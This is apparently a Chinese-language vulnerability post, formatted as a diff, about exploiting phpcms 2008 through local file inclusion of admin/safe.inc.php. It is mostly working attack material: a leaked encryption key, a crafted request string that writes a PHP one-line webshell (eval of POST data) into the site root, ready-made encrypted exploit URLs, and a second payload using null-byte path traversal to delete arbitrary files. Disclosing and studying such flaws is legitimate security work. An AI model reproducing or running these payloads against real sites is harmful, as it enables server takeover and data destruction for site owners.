@@ -1,0 +1,34 @@
+by c4rp3nt3r@0x50sec.org
+
+phpcms2008 sp2 or sp4偶没自信看
+这年头发个bug伤不起啊，厂商忽略，被人当成装X，有木有？心情不爽啊不管这么多了。
+
+也木有什么危害，就直接发出来吧。
+phpcms本地包含拿shell的方法，这篇文章接上一个
+http://www.wooyun.org/bugs/wooyun-2010-01795
+《phpcms的phpcms_auth导致的任意变量覆盖漏洞、本地文件包含漏洞和任意文件下载漏洞》
+
+phpcms本地包含类漏洞，如果该文件包含了/include/common.inc.php就可以包含执行很多后台才能执行的文件了。
+
+由于phpcms的全局变量机制，导致能拿shell的方法很多，类似的问题不止一个。
+
+admin/safe.inc.php文件是后台扫木马的程序，但是很可惜的是虽然文件名叫做safe，但是一点也不safe。
+
+公布一个本地包含秒杀拿shell的方法。
+
+包含:admin/safe.inc.php文件GET提交一下数据
+将在根目录下生成一句话
+用上一篇得到的密钥$key='sIpeofogblFVCildZEwe';
+加密如下字符串
+
+$evil='i=1&m=1&f=fuck&action=edit_code&file_path=evil.php&code=<?eval($_POST[a])?>&mod=../../admin/safe.inc.php%00';
+
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBUBBhIwBA0II3AlAAABBTUWERt0FRMGCkEXChxgNSwNCVlmehITEiVYQTA2IDQ2NycLalZSQjcqE1hdZ19LQUkOAw8FKHkwCAoBdCwZBl05GBVKVl8=
+将在根目录下生成一句话木马
+
+同理任意文件删除漏洞：
+$evil='i=1&m=1&f=fuck&action=del_file&files=robots.txt&mod=../../admin/safe.inc.php%00';
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBQAAzkJDg4JYDAqBQkXZzcYBxw9A0sbHhtBDwMia21HQ0p0ahYBHiAeShwHCQJMBSg1bRkEFH91Rw==
+
+参考:Flyh4t [PhpCMS]一个漏洞的二次利用
+
